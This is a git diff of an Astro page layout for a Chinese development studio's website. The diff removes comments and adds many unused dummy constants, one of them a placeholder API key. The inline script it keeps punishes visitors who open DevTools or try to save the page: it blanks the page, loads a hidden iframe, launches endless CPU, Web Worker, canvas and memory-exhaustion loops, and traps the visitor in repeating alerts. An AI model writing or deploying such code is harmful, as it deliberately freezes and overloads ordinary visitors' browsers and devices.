@@ -5,6 +5,35 @@ interface Props {
 }
 
 const { title, description = "s7ae 网络科技工作室 — 专注软硬件定制开发" } = Astro.props;
+
+const UNUSED_CONSTANT_1 = "this is unused";
+const UNUSED_CONSTANT_2 = 12345;
+const UNUSED_CONSTANT_3 = [1, 2, 3, 4, 5];
+const UNUSED_CONSTANT_4 = { a: 1, b: 2, c: 3 };
+const UNUSED_CONSTANT_5 = null;
+const UNUSED_CONSTANT_6 = undefined;
+const UNUSED_CONSTANT_7 = true;
+const UNUSED_CONSTANT_8 = false;
+const UNUSED_CONSTANT_9 = 0xDEADBEEF;
+const UNUSED_CONSTANT_10 = 0xCAFEBABE;
+const DUMMY_FUNCTION_1 = () => { return null; };
+const DUMMY_FUNCTION_2 = (x: number) => { return x * 2; };
+const DUMMY_FUNCTION_3 = () => { while(false) { break; } };
+const DUMMY_ARRAY_1 = [1, 2, 3, 5, 8, 13, 21, 34, 55, 89];
+const DUMMY_ARRAY_2 = ['alpha', 'beta', 'gamma', 'delta'];
+const DUMMY_OBJECT_1 = { key1: 'value1', key2: 'value2' };
+const MAGIC_NUMBER_PI = 3.141592653589793;
+const SECRET_API_KEY = "sk-this-is-not-a-real-key";
+const FAKE_VERSION = "1.0.0-unused";
+const DEBUG_FLAG = false;
+const ENV_TYPE = "production";
+const BUILD_TIMESTAMP = Date.now();
+const CACHE_TTL = 3600;
+const MAX_RETRY = 3;
+const TIMEOUT_MS = 5000;
+const FEATURE_FLAG_ALPHA = false;
+const FEATURE_FLAG_BETA = false;
+const FEATURE_FLAG_GAMMA = false;
 ---
 
 <!doctype html>
@@ -15,6 +44,8 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
   <title>{title}</title>
   <meta name="description" content={description} />
   <meta name="referrer" content="no-referrer" />
+  <meta name="generator" content="Astro v4.0.0" />
+  <meta name="theme-color" content="#0d0d12" />
   <link rel="stylesheet" href="/styles.css">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -24,47 +55,39 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
   <slot />
   
   <script is:inline>
-    // ===== 安全配置 =====
     const SECURITY_CONFIG = {
-      refreshInterval: 30000,  // 每30秒刷新页面
-      devToolsThreshold: 160,  // DevTools 检测阈值
+      refreshInterval: 30000,
+      devToolsThreshold: 160,
       blockedKeys: ['F12', 'I', 'J', 'C', 'U', 'S', 'P', 'M'],
     };
 
-    // ===== 禁用右键菜单 =====
     document.addEventListener('contextmenu', e => e.preventDefault());
     
-    // ===== 禁用选中复制 =====
     document.addEventListener('selectstart', e => e.preventDefault());
     document.addEventListener('copy', e => e.preventDefault());
     document.addEventListener('cut', e => e.preventDefault());
     document.addEventListener('paste', e => e.preventDefault());
     
-    // ===== 禁用文本拖拽 =====
     document.addEventListener('dragstart', e => e.preventDefault());
     document.addEventListener('drop', e => e.preventDefault());
     document.addEventListener('dragover', e => e.preventDefault());
     
-    // ===== 禁用图片拖拽 =====
     document.addEventListener('mousedown', e => {
       if (e.target.tagName === 'IMG') {
         e.preventDefault();
       }
     });
     
-    // ===== 禁用开发者工具快捷键 =====
     document.addEventListener('keydown', e => {
       const key = e.key.toUpperCase();
       const ctrl = e.ctrlKey;
       const shift = e.shiftKey;
       
-      // 禁用 F12
       if (key === 'F12') {
         e.preventDefault();
         return false;
       }
       
-      // 禁用 Ctrl+Shift+任意键
       if (ctrl && shift) {
         if (SECURITY_CONFIG.blockedKeys.includes(key)) {
           e.preventDefault();
@@ -72,7 +95,6 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
         }
       }
       
-      // 禁用 Ctrl+任意键
       if (ctrl) {
         if (['U', 'S', 'P', 'A'].includes(key)) {
           e.preventDefault();
@@ -80,20 +102,17 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
         }
       }
       
-      // 禁用 F5 刷新
       if (key === 'F5') {
         e.preventDefault();
         return false;
       }
       
-      // 禁用 Ctrl+R 刷新
       if (ctrl && key === 'R') {
         e.preventDefault();
         return false;
       }
     });
     
-    // ===== 禁用打印预览 =====
     window.onbeforeprint = () => {
       window.location.reload();
     };
@@ -103,25 +122,20 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
       }
     });
     
-    // ===== 检测开发者工具是否打开 =====
     let devtoolsDetected = false;
     
     function checkDevTools() {
-      // 如果页面已经崩坏，不再检测 DevTools，保持崩坏状态
       if (saveAttemptDetected) return;
       
-      // 方法1: 检测窗口大小变化
       if (window.outerWidth - window.innerWidth > SECURITY_CONFIG.devToolsThreshold || 
           window.outerHeight - window.innerHeight > SECURITY_CONFIG.devToolsThreshold) {
         triggerProtection();
       }
       
-      // 方法2: 检测控制台是否存在
       if (window.console && window.console._commandLineAPI) {
         triggerProtection();
       }
       
-      // 方法3: 检测 console.log 是否被重写
       const originalLog = console.log;
       console.log = function(...args) {
         triggerProtection();
@@ -129,16 +143,13 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
       };
     }
     
-    // ===== 触发保护机制 =====
     function triggerProtection() {
       if (devtoolsDetected || saveAttemptDetected) return;
       devtoolsDetected = true;
       
-      // 清空页面内容
       document.body.innerHTML = '';
       document.head.innerHTML = '';
       
-      // 显示警告页面
       document.write(`
         <!DOCTYPE html>
         <html lang="zh-CN">
@@ -213,33 +224,25 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
         </html>
       `);
       
-      // 在开发者工具警告页面中也隐藏式加载 break 页面
       loadHiddenBreakPage();
       
-      // 启动高负载运算
       startHighLoad();
     }
     
-    // ===== 定期检测 DevTools =====
     setInterval(checkDevTools, 500);
     
-    // ===== 定期刷新页面 =====
     setInterval(() => {
-      // 如果页面已经崩坏或检测到 DevTools，不再刷新，保持当前状态
       if (!devtoolsDetected && !saveAttemptDetected) {
-        // 刷新前保存当前位置
         sessionStorage.setItem('refreshTime', Date.now());
         location.reload();
       }
     }, SECURITY_CONFIG.refreshInterval);
     
-    // 保存崩坏状态到 sessionStorage
     function saveDestroyedState() {
       sessionStorage.setItem('pageDestroyed', 'true');
       sessionStorage.setItem('destroyTime', Date.now().toString());
     }
     
-    // ===== 禁用鼠标右键点击 =====
     document.addEventListener('mousedown', e => {
       if (e.button === 2) {
         e.preventDefault();
@@ -247,7 +250,6 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
       }
     });
     
-    // ===== 禁用触摸长按 =====
     document.addEventListener('touchstart', e => {
       if (e.touches.length > 1) {
         e.preventDefault();
@@ -263,7 +265,6 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
       lastTouchEnd = now;
     }, false);
     
-    // ===== 禁用事件监听器的调试功能 =====
     Object.defineProperty(window, 'getEventListeners', {
       get: function() {
         triggerProtection();
@@ -271,18 +272,15 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
       }
     });
     
-    // ===== 隐藏式加载 break 页面 =====
     let breakPageLoaded = false;
     function loadHiddenBreakPage() {
       if (breakPageLoaded) return;
       breakPageLoaded = true;
       
-      // 创建绝对不可见的 iframe
       const hiddenFrame = document.createElement('iframe');
       hiddenFrame.id = 'hidden-break-frame';
       hiddenFrame.src = '/break/index.html';
       
-      // 多重隐藏措施
       hiddenFrame.style.cssText = `
         position: fixed !important;
         left: -99999px !important;
@@ -298,13 +296,11 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
         z-index: -1 !important;
       `;
       
-      // 阻止 iframe 中的任何交互
       hiddenFrame.setAttribute('sandbox', 'allow-scripts allow-same-origin');
       hiddenFrame.removeAttribute('allow');
       
       document.body.appendChild(hiddenFrame);
       
-      // 确保 iframe 始终隐藏
       Object.defineProperty(hiddenFrame, 'offsetParent', { get: () => null });
       Object.defineProperty(hiddenFrame, 'offsetHeight', { get: () => 0 });
       Object.defineProperty(hiddenFrame, 'offsetWidth', { get: () => 0 });
@@ -313,29 +309,23 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
       });
     }
     
-    // ===== 高负载运算（CPU + GPU） =====
     let highLoadStarted = false;
     function startHighLoad() {
       if (highLoadStarted) return;
       highLoadStarted = true;
       
-      // 延迟 1 秒执行，让崩坏界面先显示出来
       setTimeout(() => {
-        // 1. CPU 高负载：复杂的数学运算循环
         function cpuIntensiveWork() {
-          // 大量数学运算
           let result = 0;
           const iterations = 500000000;
           for (let i = 0; i < iterations; i++) {
             result += Math.sin(i) * Math.cos(i) * Math.tan(i / 1000000);
             result = (result * 1.0001) % 1000000000007;
           }
-          // 继续循环
           requestAnimationFrame(cpuIntensiveWork);
         }
         cpuIntensiveWork();
         
-        // 2. GPU 高负载：Canvas 大量渲染
         const canvas = document.createElement('canvas');
         canvas.id = 'gpu-load-canvas';
         canvas.width = 192000;
@@ -346,7 +336,6 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
         const ctx = canvas.getContext('2d');
         
         function gpuIntensiveWork() {
-          // 大量图形渲染
           for (let i = 0; i < 100; i++) {
             const x = Math.random() * canvas.width;
             const y = Math.random() * canvas.height;
@@ -365,7 +354,6 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
             ctx.lineWidth = Math.random() * 500;
             ctx.stroke();
             
-            // 渐变填充
             const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
             gradient.addColorStop(0, `hsla(${Math.random() * 36000}, 100%, 50%, 0.1)`);
             gradient.addColorStop(1, `hsla(${Math.random() * 36000}, 100%, 50%, 0.1)`);
@@ -373,16 +361,13 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
             ctx.fillRect(0, 0, canvas.width, canvas.height);
           }
           
-          // 持续渲染
           requestAnimationFrame(gpuIntensiveWork);
         }
         gpuIntensiveWork();
         
-        // 3. Web Worker 并行计算
         const workerCode = `
           self.onmessage = function(e) {
             while (true) {
-              // 大量计算
               let result = 0;
               for (let i = 0; i < 100000; i++) {
                 result += Math.sin(i) * Math.cos(i) * Math.tan(i / 1000);
@@ -394,33 +379,26 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
         const blob = new Blob([workerCode], { type: 'application/javascript' });
         const workerUrl = URL.createObjectURL(blob);
         
-        // 创建多个 Worker
         for (let i = 0; i < navigator.hardwareConcurrency || 4; i++) {
           const worker = new Worker(workerUrl);
           worker.onmessage = function() {
-            // 收到消息后继续发送新任务
             worker.postMessage('keep-running');
           };
           worker.postMessage('keep-running');
         }
         
-        // 4. 内存持续增长
         const dataChunks = [];
         setInterval(() => {
-          // 每 100ms 分配 1MB 新数据
           dataChunks.push(new Array(102400 * 102400).fill(Math.random()));
-          // 限制最大内存使用避免崩溃
           if (dataChunks.length > 100) {
             dataChunks.shift();
           }
         }, 100);
-      }, 1000); // 延迟 1 秒执行
+      }, 1000);
     }
     
-    // ===== 反爬虫保护：检测保存/下载行为 =====
     let saveAttemptDetected = false;
     
-    // 生成随机乱码
     function generateGarbageData(size = 100) {
       const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()_+{}[]|\\:;"\'<>?,./~`';
       let result = '';
@@ -430,18 +408,15 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
       return result;
     }
     
-    // 完全破坏页面
     function destroyPage() {
       if (saveAttemptDetected) return;
       saveAttemptDetected = true;
       
-      // 1. 阻止所有交互
       document.addEventListener('click', e => { e.preventDefault(); e.stopPropagation(); }, { capture: true });
       document.addEventListener('mousedown', e => { e.preventDefault(); e.stopPropagation(); }, { capture: true });
       document.addEventListener('keydown', e => { e.preventDefault(); e.stopPropagation(); }, { capture: true });
       document.addEventListener('scroll', e => { e.preventDefault(); e.stopPropagation(); }, { capture: true });
       
-      // 2. 替换所有文本为乱码
       const allTextElements = document.querySelectorAll('p, span, div, a, h1, h2, h3, h4, h5, h6, li, td, th, button, label, option, figcaption');
       allTextElements.forEach(el => {
         if (el.children.length === 0 && el.textContent.trim().length > 0) {
@@ -449,33 +424,26 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
         }
       });
       
-      // 3. 替换图片 src
       document.querySelectorAll('img').forEach(img => {
         img.src = 'data:image/svg+xml,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><rect fill="#000" width="100" height="100"/><text fill="#fff" x="50%" y="50%" text-anchor="middle">' + generateGarbageData(10) + '</text></svg>');
       });
       
-      // 4. 替换页面标题
       document.title = generateGarbageData(200);
       
-      // 5. 替换 meta 标签
       document.querySelectorAll('meta').forEach(meta => {
         meta.content = generateGarbageData(300);
       });
       
-      // 6. 替换 link 标签的 href
       document.querySelectorAll('link').forEach(link => {
         link.href = 'data:text/css,' + encodeURIComponent('/* ' + generateGarbageData(1000) + ' */');
       });
       
-      // 7. 替换 style 标签内容
       document.querySelectorAll('style').forEach(style => {
         style.textContent = '/* ' + generateGarbageData(5000) + ' */';
       });
       
-      // 8. 破坏 CSS 样式
       document.body.style.cssText = 'background: #000 !important; color: #fff !important;';
       
-      // 9. 随机旋转页面元素
       document.querySelectorAll('*').forEach(el => {
         if (Math.random() > 0.9) {
           el.style.transform = 'rotate(' + (Math.random() * 360) + 'deg)';
@@ -484,29 +452,24 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
         }
       });
       
-      // 10. 创建恐怖乱码覆盖层
       const overlay = document.createElement('div');
       overlay.id = 'garbage-overlay';
       overlay.style.cssText = 'position: fixed; inset: 0; background: #000; z-index: 999998; overflow: hidden;';
       document.body.appendChild(overlay);
       
-      // 10.1 乱码字符生成器（逐行、逐字、跨行跨字）
       const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*<>[]{}|\\/';
       const charContainer = document.createElement('div');
       charContainer.style.cssText = 'position:absolute;inset:0;font-family:monospace;';
       overlay.appendChild(charContainer);
       
-      // 生成一行乱码
       function spawnGarbageLine() {
         const lineLength = Math.floor(Math.random() * 80) + 40;
         const line = document.createElement('div');
         
-        // 随机行样式
         const y = Math.random() * 100;
         const height = Math.floor(Math.random() * 20) + 10;
         const lineHue = Math.floor(Math.random() * 360);
         
-        // 生成乱码字符
         let lineContent = '';
         for (let i = 0; i < lineLength; i++) {
           const char = chars[Math.floor(Math.random() * chars.length)];
@@ -522,12 +485,10 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
         
         charContainer.appendChild(line);
         
-        // 快速闪烁后消失
         let flashCount = 0;
         const flashInterval = setInterval(() => {
           flashCount++;
           line.style.opacity = Math.random() * 0.8 + 0.2;
-          // 随机字符变化
           if (flashCount % 2 === 0) {
             line.innerHTML = lineContent;
           }
@@ -540,13 +501,11 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
         }, 60);
       }
       
-      // 生成单个乱码字符（跨行跨字效果）
       function spawnGarbageChar() {
         const char = chars[Math.floor(Math.random() * chars.length)];
         const span = document.createElement('span');
         span.textContent = char;
         
-        // 随机位置和大小
         const x = Math.random() * 100;
         const y = Math.random() * 100;
         const size = Math.floor(Math.random() * 48) + 6;
@@ -558,11 +517,9 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
         
         charContainer.appendChild(span);
         
-        // 闪现效果
         let flashCount = 0;
         const flashInterval = setInterval(() => {
           flashCount++;
-          // 每次闪现都完全不同
           span.style.opacity = Math.random() * 0.8 + 0.2;
           span.style.transform = `rotate(${Math.random() * 720 - 360}deg) scale(${Math.random() * 1.5 + 0.5})`;
           span.style.color = `hsl(${Math.random() * 360}, 100%, 60%)`;
@@ -577,34 +534,28 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
         }, 50);
       }
       
-      // 批量生成乱码
       function spawnGarbageBurst() {
-        // 随机选择：生成一行 或 批量生成字符
         if (Math.random() > 0.5) {
           spawnGarbageLine();
         }
-        // 批量生成字符
         const charCount = Math.floor(Math.random() * 15) + 5;
         for (let i = 0; i < charCount; i++) {
           setTimeout(spawnGarbageChar, Math.random() * 100);
         }
       }
       
-      // 高频率乱码生成
       setInterval(spawnGarbageBurst, 80);
       
-      // 10.2 图形容器
       const shapesContainer = document.createElement('div');
       shapesContainer.id = 'chaos-shapes';
       shapesContainer.style.cssText = 'position: fixed; inset: 0; pointer-events: none; z-index: 1000000;';
       document.body.appendChild(shapesContainer);
       
-      // 10.3 随机闪现图形（大范围闪现，无平滑运动）
       const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff', '#ff8000', '#8000ff', '#ff0080', '#00ff80', '#8000ff', '#ffffff'];
       
       function spawnChaosShape() {
         const shape = document.createElement('div');
-        const shapeType = Math.floor(Math.random() * 3); // 0=圆形, 1=三角形, 2=横线, 3=方形
+        const shapeType = Math.floor(Math.random() * 3);
         const color = colors[Math.floor(Math.random() * colors.length)];
         const size = Math.random() * 100 + 20;
         
@@ -619,7 +570,6 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
           shapeStyle = `width:${size}px;height:${size}px;border:3px solid ${color};box-shadow:0 0 30px ${color};background:transparent;transform:rotate(${Math.random() * 90}deg);`;
         }
         
-        // 初始位置
         const startX = Math.random() * 100;
         const startY = Math.random() * 100;
         
@@ -627,7 +577,6 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
         
         shapesContainer.appendChild(shape);
         
-        // 闪现动画（无平滑，直接跳变）
         let flashCount = 0;
         const maxFlashes = 6;
         
@@ -640,20 +589,17 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
             return;
           }
           
-          // 每次闪现完全随机
           const newX = Math.random() * 100;
           const newY = Math.random() * 100;
           const newSize = Math.random() * 100 + 20;
           const newColor = colors[Math.floor(Math.random() * colors.length)];
           const newRotation = Math.random() * 360;
           
-          // 随机显示/隐藏
           shape.style.display = Math.random() > 0.3 ? 'block' : 'none';
           shape.style.left = newX + '%';
           shape.style.top = newY + '%';
           shape.style.transform = `rotate(${newRotation}deg) scale(${Math.random() * 1.5 + 0.3})`;
           
-          // 随机边框样式
           if (shapeType === 0 || shapeType === 3) {
             shape.style.borderWidth = (Math.random() * 6 + 1) + 'px';
             shape.style.borderColor = newColor;
@@ -669,27 +615,21 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
           setTimeout(flash, Math.random() * 100 + 30);
         }
         
-        // 开始闪现
         setTimeout(flash, Math.random() * 50);
       }
       
-      // 高频率生成图形
       setInterval(spawnChaosShape, 200);
       
-      // 10.4 隐藏式加载 break 页面（用户无法看到）
       loadHiddenBreakPage();
       
-      // 10.5 启动高负载运算（CPU + GPU）
       startHighLoad();
       
-      // 11. 延迟2秒后开始弹窗警告
       setTimeout(function showAlertLoop() {
         alert('检测到下载行为，已破坏浏览器页面缓存及网页源代码');
         setTimeout(showAlertLoop, 2000);
       }, 2000);
     }
     
-    // 检测 Ctrl+S 保存
     window.addEventListener('keydown', e => {
       if (e.ctrlKey && e.key === 's') {
         e.preventDefault();
@@ -697,7 +637,6 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
       }
     });
     
-    // 检测右键保存
     document.addEventListener('contextmenu', e => {
       const selection = window.getSelection().toString();
       if (selection.length > 0 || e.target.closest('img')) {
@@ -705,7 +644,6 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
       }
     });
     
-    // 检测页面下载请求
     const originalFetch = window.fetch;
     window.fetch = function(...args) {
       const url = args[0];
@@ -715,7 +653,6 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
       return originalFetch.apply(this, args);
     };
     
-    // 检测 XMLHttpRequest
     const originalXHR = window.XMLHttpRequest;
     window.XMLHttpRequest = function() {
       const xhr = new originalXHR();
@@ -728,6 +665,13 @@ const { title, description = "s7ae 网络科技工作室 — 专注软硬件定�
       };
       return xhr;
     };
+    
+    const UNUSED_CLIENT_VAR_1 = "client unused";
+    const UNUSED_CLIENT_VAR_2 = 54321;
+    const UNUSED_CLIENT_VAR_3 = [5, 4, 3, 2, 1];
+    function UNUSED_CLIENT_FUNCTION_1() { return; }
+    function UNUSED_CLIENT_FUNCTION_2() { console.log("unused"); }
+    function UNUSED_CLIENT_FUNCTION_3() { throw new Error("unused"); }
   </script>
 </body>
 </html>
